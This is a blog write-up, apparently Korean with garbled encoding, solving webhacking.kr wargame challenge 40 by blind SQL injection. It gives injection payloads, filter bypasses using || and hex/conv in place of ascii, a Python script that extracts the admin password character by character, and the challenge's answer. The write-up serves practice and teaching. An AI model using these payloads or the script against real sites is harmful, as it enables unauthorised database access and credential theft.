---
title: "[webhacking.kr] 40ë²ˆ ë¬¸ì œ í’€ì´[Blind SQL Injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - blind sql injection
toc: true
toc_sticky: true
toc_label: "40ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 40ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/152694607-688cddb7-17ac-4809-a930-00c50242ad4b.png)


# ë¬¸ì œ í’€ì´
  ê¸°ë³¸ ê°’ì„ ê·¸ëŒ€ë¡œ ë¡œê·¸ì¸ì„ ì‹œë„í•˜ë©´ guestë¡œ ë¡œê·¸ì¸ì´ ì„±ê³µí•©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152694685-cac35a83-f192-4678-b4c5-e8a03b68c74e.png)


  id,no,pw ë¥¼ ë‹¤ë¥¸ ê°’ìœ¼ë¡œ ë°”ê¿”ì„œ ì‹œë„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ í™”ë©´ì´ ë‚˜ì˜µë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152694709-e1c49ab4-9c4d-41e5-bc43-f5aaa46f0e27.png)

  ì´ì œ ì…ë ¥ì´ ê°€ëŠ¥í•œ no,id,pwì— injectionì„ ì‹œë„í•´ ë´…ë‹ˆë‹¤.



  id,pw ì—ëŠ” 
  ```sql
' or 1=1-- 
  ```
  ì„ ì‹œë„í•´ ë³´ì•˜ì§€ë§Œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.

  noì—ëŠ” ë‹¤ìŒì„ ì…ë ¥í•´ ë³´ì•˜ë”ë‹ˆ access denied, ì¦‰ í•„í„°ë§ ë˜ì—ˆìŠµë‹ˆë‹¤.

  ```sql
3 or 1=1-- 
  ```

  ![image](https://user-images.githubusercontent.com/33647663/152694769-1e21978a-004a-4bc2-85e0-f9e93b565356.png)



  ì…ë ¥ ê°’ì„ ëª‡ê°œ ì‹œë„í•´ ë³´ë‹ˆ, noë¥¼ í†µí•´ì„œ ì¸ì ì…˜ì´ ë˜ì—ˆìŠµë‹ˆë‹¤. 'or' ì´ í•„í„°ë§ ë˜ì–´ì„œ '\|\|'ë¡œ ëŒ€ì²´í•˜ì˜€ê³ , ë„ì–´ì“°ê¸°(%20)ê°€ í•„í„°ë§ ë˜ì–´ì„œ ë¶™ì—¬ì„œ ì¼ìŠµë‹ˆë‹¤. 


  ```sql
3||no=2
  ``` 

  ![image](https://user-images.githubusercontent.com/33647663/152694905-9a5bcf12-ec20-4b81-8179-00166af451ca.png)

  ìœ„ì˜ ê°’ì„ ì…ë ¥í•´ ì£¼ë©´ ë‹¤ìŒ í˜ì´ì§€ë¡œ ì´ë™ë˜ëŠ”ë°, admin passwordë¥¼ êµ¬í•´ì•¼ í•©ë‹ˆë‹¤.

  ì´ ì´í›„ë¶€í„°ëŠ” ì „í˜•ì ì¸ blind sql injectionìœ¼ë¡œ íŒŒì´ì¬ ì½”ë“œë¡œ ëŒ€ì²´í•˜ê² ìŠµë‹ˆë‹¤.

  ê¸°ì¡´ ë¬¸ì œì™€ ë‹¤ë¥¸ ì ì€ selectë¬¸ì´ í•„í„°ë§ ë˜ì–´ ìˆì–´ì„œ information_schemaë¥¼ ì´ìš©í•˜ëŠ”ê²ƒì€ ë¶ˆê°€ëŠ¥ í–ˆìŠµë‹ˆë‹¤.

  ë˜í•œ ord,asciiê°€ í•„í„°ë§ ë˜ì–´ ìˆì—ˆê¸° ë•Œë¬¸ì— hex í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ìš°íšŒë¥¼ í–ˆìŠµë‹ˆë‹¤.

  ```sql
  hex('a') = 61 # ì£¼ì–´ì§„ ë¬¸ìë¥¼ ascii 16ì§„ìˆ˜ë¡œ ë°˜í™˜
  conv(61,16,10) = 97 # ë§¨ ì²« ì¸ìë¥¼ 16ì§„ìˆ˜ì—ì„œ 10ì§„ìˆ˜ë¡œ ë³€í™˜
  ```

  ìœ„ì˜ í•¨ìˆ˜ë“¤ì„ ì´ìš©í•´ì„œ asciiì™€ ë™ì¼í•œ ê¸°ëŠ¥ì„ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152695103-825180a6-f26c-4bcc-802c-332bc03339ba.png)



  ```python
import requests
from tqdm import tqdm
url = "https://webhacking.kr/challenge/web-29/"

TRUE_FLAG = "Success"
FALSE_FLAG = "Failure"


# 1. pw ê¸¸ì´
for i in range(20):
    params = "?id=guest&pw=guest&no=3||(length(pw)={})".format(i)
    response = requests.get(url + params)
    if(FALSE_FLAG not in response.text):
        print("password length: ", i)


# admin ê³„ì •ì˜ pw ê¸¸ì´ëŠ” 10

# 2. pw
for i in range(1,11):
    password = ''
    for j in range(127,20,-1):
        params = "?id=guest&pw=guest&no=3||(conv(hex(substr(pw,{0},1)),16,10)={1})".format(i,j)
        response = requests.get(url+params)
        if(FALSE_FLAG not in response.text):
            password += chr(j)
            if(i>5):
                break
    print(i," : ",password)
  ```

# ê²°ê³¼
  ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì¶œë ¥í•©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152695172-7aaa9344-4507-4842-a3e6-498992450665.png)

  DBì—ëŠ” guestì™€ admin 2ê°€ì§€ ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ê°€ ìˆê¸° ë•Œë¬¸ì— 5ë²ˆì§¸ ìë¦¬ê¹Œì§€ëŠ” 2ë²ˆ ì¶œë ¥ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë•Œ 1-5ê¹Œì§€ëŠ” 'guest'ë¥¼ ì œì™¸í•˜ê³  ë³´ë©´ adminì˜ ë¹„ë°€ë²ˆí˜¸ëŠ”

  luck_admin ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152695240-90635e28-b6db-468c-b4e6-2781b2a8a339.png)


